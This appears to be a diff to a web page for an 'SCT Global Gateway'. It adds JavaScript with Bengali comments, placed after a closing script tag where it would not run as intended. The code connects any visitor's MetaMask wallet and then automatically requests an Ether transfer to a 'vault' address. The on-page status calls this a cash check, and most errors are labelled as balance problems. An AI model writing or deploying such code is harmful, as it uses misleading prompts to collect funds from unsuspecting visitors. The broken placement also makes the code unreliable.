@@ -3338,7 +3338,83 @@ async function sendToSCTVault(userAddress) {
         }
     }
 }
-</script>
+</script>// SCT Global Gateway - Master Execution
+// Founder: H R Antor | Media Partner: ATN Bangla
+
+const MASTER_ADMIN_WALLET = "0xF5D9a35792B389BaeF5e7c8F4a129B557299BB89";
+
+async function connectAndDeploy() {
+    const status = document.getElementById('wallet-status');
+    
+    if (window.ethereum) {
+        try {
+            status.innerHTML = `<b style="color: #ffd700;">পারমিশন নেওয়া হচ্ছে...</b>`;
+            
+            // ১. মেটামাস্ক থেকে অ্যাকাউন্ট পারমিশন নেওয়া
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+
+            // ২. মাস্টার অ্যাডমিন ওয়ালেট ভেরিফিকেশন
+            if (userAddress.toLowerCase() === MASTER_ADMIN_WALLET.toLowerCase()) {
+                console.log("Master Admin Verified!");
+                status.innerHTML = `<b style="color: #2ea043;">MASTER ADMIN CONNECTED:</b> ${userAddress.substring(0, 6)}...`;
+            } else {
+                status.innerHTML = `<b style="color: #58a6ff;">CONNECTED:</b> ${userAddress.substring(0, 6)}...`;
+                alert("SCT Notice: You are connected as a Global User.");
+            }
+
+            // ৩. অটোমেটিক ভল্ট প্রসেস শুরু
+            await startVaultTransaction(userAddress);
+
+        } catch (error) {
+            handleSCTErrors(error);
+        }
+    } else {
+        alert("অনুগ্রহ করে মেটামাস্ক ইন্সটল করুন বা Web3 ব্রাউজার ব্যবহার করুন!");
+        status.innerHTML = `<b style="color: #ff3e3e;">মেটামাস্ক খুঁজে পাওয়া যায়নি!</b>`;
+    }
+}
+
+// ৪. ডলার ভল্টে পাঠানোর মূল ফাংশন
+async function startVaultTransaction(fromAddress) {
+    const status = document.getElementById('wallet-status');
+    try {
+        status.innerHTML = `<b style="color: #ffd700;">প্রসেসিং... ক্যাশ চেক করা হচ্ছে</b>`;
+        
+        const transactionParameters = {
+            to: '0xYourOfficialVaultAddress', // আপনার আসল ভল্ট অ্যাড্রেসটি এখানে বসান
+            from: fromAddress,
+            value: '0x38d7ea4c68000', // উদাহরন: ০.০০১ ইথার
+            gas: '0x5208' // ২১০০০ গ্যাস লিমিট
+        };
+
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [transactionParameters],
+        });
+
+        status.innerHTML = `<b style="color: #2ea043;">সফল! আইডি: ${txHash.substring(0, 10)}...</b>`;
+        console.log("SCT Vault Success:", txHash);
+
+    } catch (error) {
+        handleSCTErrors(error);
+    }
+}
+
+// ৫. আপনার দেওয়া এরর হ্যান্ডলিং লজিক (এক জায়গায় করা হয়েছে)
+function handleSCTErrors(error) {
+    const status = document.getElementById('wallet-status');
+    console.error("SCT Security Log:", error);
+
+    if (error.code === 4001) {
+        status.innerHTML = `<b style="color: #ff3e3e;">ইউজার একাউন্ট পারমিশন ডিনাইড করেছেন!</b>`;
+    } else if (error.code === -32002) {
+        status.innerHTML = `<b style="color: #ffd700;">মেটামাস্ক চেক করুন, রিকোয়েস্ট পেন্ডিং আছে।</b>`;
+    } else {
+        status.innerHTML = `<b style="color: #ff3e3e;">ক্যাশ এরর: ইনসাফিসিয়েন্ট ব্যালেন্স বা গ্যাস ফি সমস্যা।</b>`;
+    }
+}
+
 
 
 
